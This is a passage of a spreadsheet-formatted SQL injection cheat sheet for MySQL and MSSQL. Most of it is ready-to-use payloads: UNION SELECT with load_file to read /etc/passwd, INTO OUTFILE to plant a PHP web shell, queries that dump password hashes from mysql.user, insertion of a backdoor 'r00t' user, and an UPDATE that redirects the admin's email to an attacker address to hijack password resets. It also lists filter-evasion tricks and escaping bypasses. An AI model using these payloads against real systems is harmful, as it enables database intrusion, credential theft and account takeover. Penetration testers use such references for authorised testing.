        <table:table-row table:style-name="ro19">
          <table:table-cell table:style-name="ce4" office:value-type="string" calcext:value-type="string">
            <text:p>Some very skilled programmers use some routines to escape the user input to avoid sql injection problems. Some of them escape the ‘ char with a \ (for example who uses php with a sql server db). He does not know that on mssql the escape is not \ but ”. So you can inject as normal, but you can not use the ‘ on the query. This can sometimes be a problem. To bypass this limitation you can use SET <text:a xlink:href="http://msdn2.microsoft.com/en-us/library/ms174393.aspx" xlink:type="simple">QUOTED_IDENTIFIER</text:a> OFF and use ” instead of ‘. Here is an example:</text:p>
          </table:table-cell>
          <table:table-cell/>
        </table:table-row>
        <table:table-row table:style-name="ro1" table:number-rows-repeated="2">
          <table:table-cell table:number-columns-repeated="2"/>
        </table:table-row>
        <table:table-row table:style-name="ro8">
          <table:table-cell table:style-name="ce2" office:value-type="string" calcext:value-type="string">
            <text:p>5 – MISC and Functions</text:p>
          </table:table-cell>
          <table:table-cell/>
        </table:table-row>
        <table:table-row table:style-name="ro12">
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Some TRUE statements</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>0.1 &lt;= 2;</text:p>
            <text:p>2 &gt;= 2;</text:p>
            <text:p>ISNULL(1/0);</text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row table:style-name="ro10">
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>MATH</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>FLOOR(7+RAND()*5));</text:p>
            <text:p>ROUND(23.298,-1);</text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row table:style-name="ro1">
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>LENGTH</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>LENGTH(COMPRESS(REPEAT(‘a’,1000)));</text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row table:style-name="ro10">
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>HASH</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>MD5(‘abc’);</text:p>
            <text:p>SHA1(‘abc’);</text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row table:style-name="ro12">
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>BENCHMARK / SLEEP</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce4" office:value-type="string" calcext:value-type="string">
            <text:p>BENCHMARK(10000000,ENCODE('abc','123')); #~5s on localhost</text:p>
            <text:p>BENCHMARK(1000000,MD5(CHAR(116))); #~7s on localhost</text:p>
            <text:p>BENCHMARK(10000000,MD5(CHAR(116))); #~70s on localhost</text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row table:style-name="ro10">
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Timeout / sleep IF user exists</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce4" office:value-type="string" calcext:value-type="string">
            <text:p>IF( user = 'root', BENCHMARK(1000000,MD5( 'x' )),NULL) FROM login</text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row table:style-name="ro14">
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Write to files without single quotes (chars = ‘admin’)</text:p>
            <text:p>Must specify new file and give correct path name</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce4" office:value-type="string" calcext:value-type="string">
            <text:p>SELECT password FROM tablename WHERE username =</text:p>
            <text:p>CONCAT(CHAR(39),CHAR(97),CHAR(100),CHAR(109),CHAR(105),CHAR(110),CHAR( 39)) INTO</text:p>
            <text:p>OUTFILE CONCAT(CHAR(39),CHAR(97),CHAR(100),CHAR(109),CHAR(105),CHAR(110),CHAR(</text:p>
            <text:p>39))</text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row table:style-name="ro15">
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>INTO OUTFILE</text:p>
            <text:p> Requires file_priv</text:p>
            <text:p> you can’t overwrite files with INTO OUTFILE</text:p>
            <text:p> INTO OUTFILE must be the last statement in the query</text:p>
            <text:p> there is no way I know of to encode the pathname, so quotes are required</text:p>
            <text:p> you can encode your code with char()</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce4"/>
        </table:table-row>
        <table:table-row table:style-name="ro13">
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Write userdb into outfile</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce4" office:value-type="string" calcext:value-type="string">
            <text:p>SELECT host,user,password FROM user INTO OUTFILE ‘/tmp/passwd’;</text:p>
            <text:p>SELECT host,user,password FROM user INTO OUTFILE ‘../../web/dir/file.txt’</text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row table:style-name="ro10">
          <table:table-cell table:style-name="ce5" office:value-type="string" calcext:value-type="string">
            <text:p>Retrieve etc/passwd, put into field, insert user, load data</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce4" office:value-type="string" calcext:value-type="string">
            <text:p>LOAD DATA INFILE “/etc/passwd” INTO TABLE LOGIN(profiletext,@var1) SET user = ‘r00t’,pass=’abc’</text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row table:style-name="ro1">
          <table:table-cell table:style-name="ce5" office:value-type="string" calcext:value-type="string">
            <text:p>Combine load file and into outfile to cp files</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce4" office:value-type="string" calcext:value-type="string">
            <text:p>0’ AND 1=1 UNION SELECT load_file(‘...’) INTO OUTFILE ‘...’;</text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row table:style-name="ro10">
          <table:table-cell table:style-name="ce5" office:value-type="string" calcext:value-type="string">
            <text:p>Encoding load(ed)_file. Can decrypt hex with PHP Charset Encoder or other</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce4" office:value-type="string" calcext:value-type="string">
            <text:p>0’ AND 1=1 UNION SELECT hex(load_file(‘...’)) INTO OUTFILE ‘…’;</text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row table:style-name="ro10">
          <table:table-cell table:style-name="ce5" office:value-type="string" calcext:value-type="string">
            <text:p>Write whatever you want into an arbitrary file (shell.php anyone?)</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce4" office:value-type="string" calcext:value-type="string">
            <text:p>0’ AND 1=1 UNION SELECT ‘code’,null INTO OUTFILE ‘../../web/server/dir/file.php’</text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row table:style-name="ro1">
          <table:table-cell table:style-name="ce5" office:value-type="string" calcext:value-type="string">
            <text:p>INTO DUMPFILE</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce4" office:value-type="string" calcext:value-type="string">
            <text:p>Does not split chars between data like INTO OUTFILE</text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row table:style-name="ro1">
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>CHAR (chars = ‘a’)</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce4" office:value-type="string" calcext:value-type="string">
            <text:p>CHAR(39,97,39)</text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row table:style-name="ro1">
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>INSERT</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce4" office:value-type="string" calcext:value-type="string">
            <text:p>INSERT INTO login SET user = ‘r00t’,pass=’abc’;</text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row table:style-name="ro10">
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Password reset email capability? Update user email address</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce4" office:value-type="string" calcext:value-type="string">
            <text:p>UPDATE users SET email = ‘<text:a xlink:href="mailto:mymail@attacker.com" xlink:type="simple">mymail@attacker.com</text:a>’ WHERE email = ‘<text:a xlink:href="mailto:admin@site.com" xlink:type="simple">admin@site.com</text:a>’;</text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row table:style-name="ro1">
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>HEX()</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>SELECT HEX(‘root’)</text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row table:style-name="ro1">
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>PASSWORD()</text:p>
          </table:table-cell>
          <table:table-cell/>
        </table:table-row>
        <table:table-row table:style-name="ro1">
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>ENCODE()</text:p>
          </table:table-cell>
          <table:table-cell/>
        </table:table-row>
        <table:table-row table:style-name="ro1">
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>COMPRESS()</text:p>
          </table:table-cell>
          <table:table-cell/>
        </table:table-row>
        <table:table-row table:style-name="ro1">
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>ROW_COUNT()</text:p>
          </table:table-cell>
          <table:table-cell/>
        </table:table-row>
        <table:table-row table:style-name="ro1">
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>SCHEMA()</text:p>
          </table:table-cell>
          <table:table-cell/>
        </table:table-row>
        <table:table-row table:style-name="ro1">
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>VERSION()</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>same as @@version</text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row table:style-name="ro1">
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>MID()</text:p>
          </table:table-cell>
          <table:table-cell/>
        </table:table-row>
        <table:table-row table:style-name="ro14">
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Prefixes. Use prefixes and whitespaces as often as you want</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>“”</text:p>
            <text:p>+</text:p>
            <text:p>-</text:p>
            <text:p>~</text:p>
            <text:p>!</text:p>
            <text:p>@</text:p>
            <text:p>“ “</text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row table:style-name="ro3">
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Operators</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce4" office:value-type="string" calcext:value-type="string">
            <text:p>^, =, !=, %, /, *, &amp;, &amp;&amp;, |, ||, , &gt;&gt;, &lt;=, &lt;=, ,, XOR, DIV, LIKE, SOUNDS LIKE, RLIKE, REGEXP, LEAST, GREATEST, CAST, CONVERT, IS, IN, NOT, MATCH, AND, OR, BINARY, BETWEEN, ISNULL</text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row table:style-name="ro19">
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>whitespaces. Use prefixes and whitespaces as often as you want</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>%20 %09 %0a %0b %0c %0d %a0 /**/</text:p>
            <text:p/>
            <text:p>Ex: ‘or+(1)sounds/**/like“1“–%a0-</text:p>
            <text:p>Ex: ‘union(select(1),tabe_name,(3)from`information_schema`.`tables`)#</text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row table:style-name="ro19">
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>comments</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>/*</text:p>
            <text:p>#</text:p>
            <text:p>%23</text:p>
            <text:p>–</text:p>
            <text:p>;%00</text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row table:style-name="ro15">
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Strings with quotes</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>SELECT ‘a’</text:p>
            <text:p>SELECT “a”</text:p>
            <text:p>SELECT n’a’</text:p>
            <text:p>SELECT b’1100001′</text:p>
            <text:p>SELECT _binary’1100001′</text:p>
            <text:p>SELECT x’61′</text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row table:style-name="ro1">
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Strings without quotes</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>‘abc’ = 0×616263</text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row table:style-name="ro12">
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Aliases</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>select pass as alias from users</text:p>
            <text:p>select pass aliasalias from users</text:p>
            <text:p>select pass`alias alias`from users</text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row table:style-name="ro15">
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Strings with functions</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>‘abc’ = unhex(616263)</text:p>
            <text:p>‘abc’ = char(97,98,99)</text:p>
            <text:p>hex(‘a’) = 61</text:p>
            <text:p>ascii(‘a’) = 97</text:p>
            <text:p>ord(‘a’) = 97</text:p>
            <text:p>‘ABC’ = concat(conv(10,10,36),conv(11,10,36),conv(12,10,36))</text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row table:style-name="ro20">
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Substrings</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>substr(‘abc’,1,1) = ‘a’</text:p>
            <text:p>substr(‘abc’ from 1 for 1) = ‘a’</text:p>
            <text:p>substring(‘abc’,1,1) = ‘a’</text:p>
            <text:p>substring(‘abc’ from 1 for 1) = ‘a’</text:p>
            <text:p>mid(‘abc’,1,1) = ‘a’</text:p>
            <text:p>mid(‘abc’ from 1 for 1) = ‘a’</text:p>
            <text:p>lpad(‘abc’,1,space(1)) = ‘a’</text:p>
            <text:p>rpad(‘abc’,1,space(1)) = ‘a’</text:p>
            <text:p>left(‘abc’,1) = ‘a’</text:p>
            <text:p>reverse(right(reverse(‘abc’),1)) = ‘a’</text:p>
            <text:p>insert(insert(‘abc’,1,0,space(0)),2,222,space(0)) = ‘a’</text:p>
            <text:p>space(0) = trim(version()from(version()))</text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row table:style-name="ro19">
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Search substrings</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>locate(‘a’,'abc’)</text:p>
            <text:p>position(‘a’,'abc’)</text:p>
            <text:p>position(‘a’ IN ‘abc’)</text:p>
            <text:p>instr(‘abc’,'a’)</text:p>
            <text:p>substring_index(‘ab’,'b’,1)</text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row table:style-name="ro10">
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Cut substrings</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>length(trim(leading ‘a’ FROM ‘abc’))</text:p>
            <text:p>length(replace(‘abc’, ‘a’, ”))</text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row table:style-name="ro19">
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Compare strings</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>strcmp(‘a’,'a’)</text:p>
            <text:p>mod(‘a’,'a’)</text:p>
            <text:p>find_in_set(‘a’,'a’)</text:p>
            <text:p>field(‘a’,'a’)</text:p>
            <text:p>count(concat(‘a’,'a’))</text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row table:style-name="ro17">
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>String case</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>ucase</text:p>
            <text:p>lcase</text:p>
            <text:p>lower</text:p>
            <text:p>upper</text:p>
            <text:p>password(‘a’) != password(‘A’)</text:p>
            <text:p>old_password(‘a’) != old_password(‘A’)</text:p>
            <text:p>md5(‘a’) != md5(‘A’)</text:p>
            <text:p>sha(‘a’) != sha(‘A’)</text:p>
            <text:p>aes_encrypt(‘a’) != aes_encrypt(‘A’)</text:p>
            <text:p>des_encrypt(‘a’) != des_encrypt(‘A’)</text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row table:style-name="ro13">
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Control flow</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>case ‘a’ when ‘a’ then 1 [else 0] end</text:p>
            <text:p>case when ‘a’='a’ then 1 [else 0] end</text:p>
            <text:p>if(‘a’='a’,1,0)</text:p>
            <text:p>ifnull(nullif(‘a’,'a’),1)</text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row table:style-name="ro1">
          <table:table-cell table:number-columns-repeated="2"/>
        </table:table-row>
        <table:table-row table:style-name="ro8">
          <table:table-cell table:style-name="ce2" office:value-type="string" calcext:value-type="string">
            <text:p>6 – Older Stuff</text:p>
          </table:table-cell>
          <table:table-cell/>
        </table:table-row>
        <table:table-row table:style-name="ro10">
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Bypassing PHP functions</text:p>
            <text:p>(MySQL 4.1.x before 4.1.20 and 5.0.x)</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce4" office:value-type="string" calcext:value-type="string">
            <text:p>WHERE x = 0xbf27admin 0xbf27</text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row table:style-name="ro21">
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Bypassing addslashes() with GBK encoding</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>"injection string"</text:p>
            <text:p>に関する追加情報：</text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row table:style-name="ro1">
          <table:table-cell table:style-name="ce4" office:value-type="string" calcext:value-type="string">
            <text:p>Bypassing mysql_real_escape_string() with BIG5 or GBK (chars are Chinese Big5)</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce4" office:value-type="string" calcext:value-type="string">
            <text:p>SELECT * FROM login WHERE user = 0x726F6F74</text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row table:style-name="ro1">
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Using HEX encoded query (user = ‘root’)</text:p>
          </table:table-cell>
          <table:table-cell/>
        </table:table-row>
        <table:table-row table:style-name="ro15">
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Funky version detection</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>/*!32302 10*/</text:p>
            <text:p>10 </text:p>
            <text:p>same response if MySQL version higher than 3.23.02</text:p>
            <text:p>SELECT /*!32302 1/0, */ 1 FROM tablename </text:p>
            <text:p>Will throw division by 0 error if MySQL version higher than 3.23.02</text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row table:style-name="ro1">
          <table:table-cell table:number-columns-repeated="2"/>
        </table:table-row>
        <table:table-row table:style-name="ro8">
          <table:table-cell table:style-name="ce2" office:value-type="string" calcext:value-type="string">
            <text:p>7 – Queries Only</text:p>
          </table:table-cell>
          <table:table-cell/>
        </table:table-row>
        <table:table-row table:style-name="ro1">
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>From PenTestMonkey</text:p>
          </table:table-cell>
          <table:table-cell/>
        </table:table-row>
        <table:table-row table:style-name="ro1">
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Version</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce4" office:value-type="string" calcext:value-type="string">
            <text:p>SELECT @@version</text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row table:style-name="ro12">
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Comments</text:p>
            <text:p>/*! */ is special MySQL, execute in MySQL only</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>SELECT 1; #comment</text:p>
            <text:p>SELECT /*comment*/1;</text:p>
            <text:p>/*! MYSQL Special SQL */ (M) </text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row table:style-name="ro19">
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Current User</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>SELECT user();</text:p>
            <text:p>AND user() LIKE 'root</text:p>
            <text:p>AND MID((user()),1,1)&gt;'m #etc etc brute</text:p>
            <text:p>SELECT system_user();</text:p>
            <text:p>SELECT current_user,null</text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row table:style-name="ro1">
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>List Users (priv)</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>SELECT user FROM mysql.user;</text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row table:style-name="ro1">
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>List Password Hashes (priv)</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce4" office:value-type="string" calcext:value-type="string">
            <text:p>SELECT host, user, password FROM mysql.user;</text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row table:style-name="ro11">
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>List Privileges (priv) (note FROM)</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>SELECT grantee, privilege_type, is_grantable FROM information_schema.user_privileges; </text:p>
            <text:p/>
            <text:p>SELECT host, user, Select_priv, Insert_priv, Update_priv, Delete_priv, Create_priv, Drop_priv, Reload_priv, Shutdown_priv, Process_priv, File_priv, Grant_priv, References_priv, Index_priv, Alter_priv, Show_db_priv, Super_priv, Create_tmp_table_priv, Lock_tables_priv, Execute_priv, Repl_slave_priv, Repl_client_priv FROM mysql.user; </text:p>
            <text:p/>
            <text:p>SELECT grantee, table_schema, privilege_type FROM information_schema.schema_privileges; — list privs on databases (schemas)SELECT table_schema, table_name, column_name, privilege_type FROM information_schema.column_privileges;</text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row table:style-name="ro13">
          <table:table-cell table:style-name="ce4" office:value-type="string" calcext:value-type="string">
            <text:p>List DBA Accounts (priv)</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>SELECT grantee, privilege_type, is_grantable FROM information_schema.user_privileges WHERE privilege_type = ‘SUPER’;SELECT host, user FROM mysql.user WHERE Super_priv = ‘Y’; </text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row table:style-name="ro1">
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Current DB</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>SELECT database()</text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row table:style-name="ro10">
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>List Databases</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>SELECT schema_name FROM information_schema.schemata;</text:p>
            <text:p>SELECT distinct(db) FROM mysql.db</text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row table:style-name="ro12">
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>List Columns</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>SELECT table_schema, table_name, column_name FROM information_schema.columns WHERE table_schema != ‘mysql’ AND table_schema != ‘information_schema’</text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row table:style-name="ro12">
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>List Tables</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>ELECT table_schema,table_name FROM information_schema.tables WHERE table_schema != ‘mysql’ AND table_schema ! = ‘information_schema’</text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row table:style-name="ro10">
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>List Table/Column Names</text:p>
            <text:p><text:a xlink:href="file:///root/Documents/Source,%20should%20get%20the%20current%20table%20and%20column%20names" xlink:type="simple">Source</text:a>, should get the current table and column names</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>PROCEDURE ANALYSE()</text:p>
            <text:p>LIMIT (1 . . n),1 PROCEDURE ANALYSE() </text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row table:style-name="ro12">
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Find Tables from Column Name</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>SELECT table_schema, table_name FROM information_schema.columns WHERE column_name = ‘username’; </text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row table:style-name="ro19">
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Select Nth Row numbered from 0</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>SELECT host,user FROM user ORDER BY host LIMIT 1 OFFSET 0;</text:p>
            <text:p>SELECT host,user FROM user ORDER BY host LIMIT 1 OFFSET 1; </text:p>
            <text:p/>
          </table:table-cell>
        </table:table-row>
        <table:table-row table:style-name="ro1">
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Select Nth Char</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>SELECT substr(‘abcd’, 3, 1); # returns c</text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row table:style-name="ro10">
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Bitwise AND</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>SELECT 6 &amp; 2; # returns 2</text:p>
            <text:p>SELECT 6 &amp; 1; # returns 0</text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row table:style-name="ro1">
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>ASCII Value → Char</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>SELECT char(65); # returns A</text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row table:style-name="ro1">
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Char → ASCII Value</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>SELECT ascii(‘A’); # returns 65</text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row table:style-name="ro10">
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Casting</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>SELECT cast(’1′ AS unsigned integer);</text:p>
            <text:p>SELECT cast(’123′ AS char);</text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row table:style-name="ro10">
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>String Concat</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>SELECT CONCAT(‘A’,'B’); #returns AB</text:p>
            <text:p>SELECT CONCAT(‘A’,'B’,'C’); # returns ABC</text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row table:style-name="ro1">
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>IF Statement</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce4" office:value-type="string" calcext:value-type="string">
            <text:p>SELECT if(1=1,’foo’,'bar’); — returns ‘foo’</text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row table:style-name="ro1">
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Case Statement</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce4" office:value-type="string" calcext:value-type="string">
            <text:p>SELECT CASE WHEN (1=1) THEN ‘A’ ELSE ‘B’ END; # returns A</text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row table:style-name="ro1">
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Avoiding Quotes (hex)</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>SELECT 0×414243; # returns ABC</text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row table:style-name="ro10">
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Time Delay BENCHMARK(times,do)</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>SELECT BENCHMARK(1000000,MD5(‘A’)); </text:p>
            <text:p>SELECT SLEEP(5); # &gt;= 5.0.12</text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row table:style-name="ro1">
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Command Exec (if mysqld &lt;5.0, running as root, and you compromise a DBA account)</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>raptor_udf.c</text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row table:style-name="ro10">
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Local file access (priv)</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce4" office:value-type="string" calcext:value-type="string">
            <text:p>UNION ALL SELECT LOAD_FILE(‘/etc/passwd’)</text:p>
            <text:p>SELECT * FROM mytable INTO dumpfile ‘/tmp/somefile’; </text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row table:style-name="ro1">
